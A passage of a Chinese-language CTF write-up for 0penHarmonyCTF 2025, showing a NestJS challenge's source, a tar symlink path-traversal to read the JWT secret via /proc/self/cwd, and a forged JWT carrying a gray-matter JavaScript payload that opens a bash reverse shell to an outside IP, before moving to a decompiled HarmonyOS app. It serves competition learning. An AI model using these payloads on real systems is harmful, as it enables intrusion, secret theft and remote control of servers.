function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;未授权&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = <span class="variable language_">this</span>.<span class="property">jwtService</span>.<span class="title function_">verify</span>(token);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;change&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;无效的令牌&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">&#x27;changePassword&#x27;</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">changePassword</span>(<span class="params"><span class="meta">@Request</span>() req, <span class="meta">@Body</span>() <span class="attr">body</span>: <span class="built_in">any</span>, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line">        <span class="keyword">const</span> &#123; password, slogon &#125; = <span class="variable language_">this</span>.<span class="title function_">getAdminConfig</span>();</span><br><span class="line">        <span class="keyword">const</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="keyword">new</span> <span class="title class_">AdminLoginDto</span>(), body)</span><br><span class="line">        <span class="keyword">const</span> errors = <span class="keyword">await</span> <span class="title function_">validate</span>(newUser, &#123;<span class="attr">forbidUnknownValues</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (errors.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadRequestException</span>(errors);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;未授权&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> decoded = <span class="variable language_">this</span>.<span class="property">jwtService</span>.<span class="title function_">verify</span>(token);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (newUser.<span class="property">slogon</span> == <span class="literal">null</span>) newUser.<span class="property">slogon</span> = slogon</span><br><span class="line">            <span class="keyword">const</span> newInfo = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newUser)</span><br><span class="line">            fs.<span class="title function_">writeFileSync</span>(configFile, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newUser, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(&#123;<span class="attr">message</span>: <span class="string">&#x27;修改成功&#x27;</span>&#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27;发生错误&#x27;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gray-matter漏洞，当我们可控jwt的时候即可RCE，接着看到上传以及下载</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Post</span>,</span><br><span class="line">  <span class="title class_">Body</span>,</span><br><span class="line">  <span class="title class_">HttpException</span>,</span><br><span class="line">  <span class="title class_">HttpStatus</span>,</span><br><span class="line">  <span class="title class_">Response</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">Query</span>,</span><br><span class="line">  <span class="title class_">Request</span>,</span><br><span class="line">  <span class="title class_">Render</span>,</span><br><span class="line">  <span class="title class_">Optional</span>,</span><br><span class="line">  <span class="title class_">BadRequestException</span>,</span><br><span class="line">  <span class="title class_">Param</span>,</span><br><span class="line">  <span class="title class_">NotFoundException</span>,</span><br><span class="line">  <span class="title class_">UploadedFile</span>,</span><br><span class="line">  <span class="title class_">UseInterceptors</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">IsString</span>, <span class="title class_">IsInt</span>, validate, <span class="title class_">ValidateIf</span>, <span class="title class_">Length</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;class-validator&#x27;</span>;</span><br><span class="line"><span class="comment">// import &#123; plainToClass &#125; from &#x27;class-transformer&#x27;;</span></span><br><span class="line"><span class="keyword">import</span> &#123;validateOrReject, <span class="title class_">Contains</span>, <span class="title class_">IsEmail</span>, <span class="title class_">IsFQDN</span>, <span class="title class_">IsDate</span>, <span class="title class_">Min</span>, <span class="title class_">Max</span>&#125; <span class="keyword">from</span> <span class="string">&quot;class-validator&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> filehelper <span class="keyword">from</span> <span class="string">&quot;./functions&quot;</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">FileInterceptor</span>&#125; <span class="keyword">from</span> <span class="string">&quot;@nestjs/platform-express&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> fs <span class="keyword">from</span> <span class="string">&quot;fs&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> uploadPath = <span class="string">&quot;/opt/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="meta">@Render</span>(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">  <span class="title function_">index</span>(<span class="params"></span>)&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">@Post</span>(<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">  <span class="meta">@UseInterceptors</span>(<span class="title class_">FileInterceptor</span>(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">doUpload</span>(<span class="params"><span class="meta">@UploadedFile</span>() <span class="attr">file</span>: <span class="title class_">Express</span>.<span class="title class_">Multer</span>.<span class="title class_">File</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> targetPath = path.<span class="title function_">join</span>(uploadPath, file.<span class="property">originalname</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(targetPath)</span><br><span class="line">    <span class="keyword">if</span>(file.<span class="property">originalname</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.zip&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.tar&quot;</span>))&#123;</span><br><span class="line">      fs.<span class="title function_">renameSync</span>(file.<span class="property">path</span>, targetPath);</span><br><span class="line">      <span class="keyword">var</span> result :<span class="built_in">string</span></span><br><span class="line">      result = <span class="keyword">await</span>  filehelper.<span class="title function_">extractArc</span>(targetPath)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">&#x27;文件上传解压成功成功！文件夹为：&#x27;</span>, <span class="attr">path</span>: path.<span class="title function_">basename</span>(result) &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      fs.<span class="title function_">renameSync</span>(file.<span class="property">path</span>, targetPath);</span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">&#x27;文件上传成功！&#x27;</span>, <span class="attr">path</span>: file.<span class="property">originalname</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;download&#x27;</span>)</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">downloadFile</span>(<span class="params"><span class="meta">@Query</span>(<span class="string">&#x27;filename&#x27;</span>) <span class="attr">filename</span>: <span class="built_in">string</span>, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(filename.<span class="title function_">includes</span>(<span class="string">&quot;./&quot;</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotFoundException</span>(<span class="string">&#x27;路径不合法&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="string">&#x27;/opt/uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotFoundException</span>(<span class="string">&#x27;文件未找到&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">download</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;下载失败&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接进行路径拼接，要是个php直接文件上传覆盖getshell了，但是这个是ts，所以瞄准下载，很明显可以进行软连接，因为只检查<code>filename</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s / password</span><br><span class="line"></span><br><span class="line">tar cvf test1.tar password</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250608-192359.jpg" alt="1"></p><p>在<code>\src\app.module.js</code>看到secret</p><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/QQ20250608-193209.jpg" alt="1"></p><p>利用进程读取(比较保险)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/download?filename=upload_1749381767703/password/proc/self/cwd/src/app.module.ts</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-4d158860f7.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web-4d158860f7.challenge.xctf.org.cn/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到<code>sec_y0u_nnnnever_know</code>，现在去伪造jwtRCE即可，在最开始的代码中我们可以得知jwt需要两个值，一个是<code>username</code>，一个是<code>slogon</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;slogon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;---js\n((require(\&quot;child_process\&quot;)).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/8.137.148.227/4444 0&gt;&amp;1&#x27;\&quot;))\n---RCE&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/index</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web-6cb2a0b1af.challenge.xctf.org.cn</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwic2xvZ29uIjoiLS0tanNcbigocmVxdWlyZShcImNoaWxkX3Byb2Nlc3NcIikpLmV4ZWNTeW5jKFwiYmFzaCAtYyAnYmFzaCAtaSA-JiAvZGV2L3RjcC84LjEzNy4xNDguMjI3LzQ0NDQgMD4mMSdcIikpXG4tLS1SQ0UifQ.-tpMuevtMhY6tq39njE7ZtYxWF5n9nIkdgMqTehCHkk</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web-6cb2a0b1af.challenge.xctf.org.cn/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/6/0penHarmonyCTF2025/1.jpg" alt="1"></p><h2 id="ezAPP-And-SERVER"><a href="#ezAPP-And-SERVER" class="headerlink" title="ezAPP_And_SERVER"></a>ezAPP_And_SERVER</h2><p><a href="https://github.com/ohos-decompiler/abc-decompiler/releases">https://github.com/ohos-decompiler/abc-decompiler/releases</a>  下载反编译工具，注意这玩意得用jdk17去加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/entryability;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/entryability/EntryAbility&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EntryAbility</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r17v2, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg0.code) == <span class="literal">null</span>) &#123;</span><br><span class="line">            hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">            hilog.error(_lexenv_1_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;Failed to load the content. Cause: %&#123;public&#125;s&quot;</span>, JSON.stringify(arg0));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        hilog2 = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog2.info(_lexenv_1_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;Succeeded in loading the content.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">1</span>, <span class="string">&quot;DOMAIN&quot;</span>, <span class="number">0</span>], <span class="number">1</span>);</span><br><span class="line">        _lexenv_0_0_ = <span class="literal">null</span>;</span><br><span class="line">        UIAbility = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as UIAbility &#125; from <span class="string">&quot;@ohos:app.ability.UIAbility&quot;</span>;</span><br><span class="line">        obj = UIAbility.#~@<span class="number">0</span>=#EntryAbility(Object2, Object3, UIAbility, [<span class="string">&quot;onCreate&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onCreate&quot;</span>, <span class="number">2</span>, <span class="string">&quot;onDestroy&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onDestroy&quot;</span>, <span class="number">0</span>, <span class="string">&quot;onWindowStageCreate&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onWindowStageCreate&quot;</span>, <span class="number">1</span>, <span class="string">&quot;onWindowStageDestroy&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onWindowStageDestroy&quot;</span>, <span class="number">0</span>, <span class="string">&quot;onForeground&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onForeground&quot;</span>, <span class="number">0</span>, <span class="string">&quot;onBackground&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/entryability/EntryAbility&amp;.#~@0&gt;#onBackground&quot;</span>, <span class="number">0</span>, <span class="number">6</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        _module_0_ = obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onCreate(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.context;</span><br><span class="line">        getApplicationContext = obj.getApplicationContext();</span><br><span class="line">        getApplicationContext.setColorMode(<span class="keyword">import</span> &#123; <span class="keyword">default</span> as ConfigurationConstant &#125; from <span class="string">&quot;@ohos:app.ability.ConfigurationConstant&quot;</span>.ColorMode.COLOR_MODE_NOT_SET);</span><br><span class="line">        global.ip = <span class="string">&quot;47.96.162.115:8080&quot;</span>;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_0_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onCreate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onDestroy(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>) &#123;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_0_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onDestroy&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#EntryAbility(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> functionObject.superConstructor(Object1, Object2, Object3, functionObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;functionObject, newTarget, <span class="built_in">this</span>, arg0&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onBackground(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>) &#123;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_0_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onBackground&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onForeground(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>) &#123;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_0_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onForeground&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onWindowStageCreate(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_1_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onWindowStageCreate&quot;</span>);</span><br><span class="line">        arg0.loadContent(<span class="string">&quot;pages/Index&quot;</span>, #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#onWindowStageDestroy(Object functionObject, Object newTarget, EntryAbility <span class="built_in">this</span>) &#123;</span><br><span class="line">        hilog = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as hilog &#125; from <span class="string">&quot;@ohos:hilog&quot;</span>;</span><br><span class="line">        hilog.info(_lexenv_0_0_, <span class="string">&quot;testTag&quot;</span>, <span class="string">&quot;%&#123;public&#125;s&quot;</span>, <span class="string">&quot;Ability onWindowStageDestroy&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给了一个IP地址，但是无伤大雅，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 